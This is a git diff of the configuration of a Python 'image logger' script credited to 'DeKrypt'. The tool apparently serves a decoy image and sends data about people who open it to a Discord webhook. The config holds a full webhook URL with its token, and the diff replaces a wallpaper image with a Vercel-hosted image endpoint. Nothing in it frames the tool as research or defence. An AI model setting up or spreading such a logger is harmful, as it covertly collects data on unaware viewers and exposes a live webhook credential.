@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1388683361274429530/2tcL1Bfs5oJIA2iMrPEnYBsl8c00QoUHcIoG-N6I7-gmokBBS21jG-nJTyKrwl8z6_c1",
-    "image": "https://c4.wallpaperflare.com/wallpaper/290/414/544/bliss-office-space-1440x900-aircraft-space-hd-art-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://tenor-steel-ten.vercel.app/api/image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
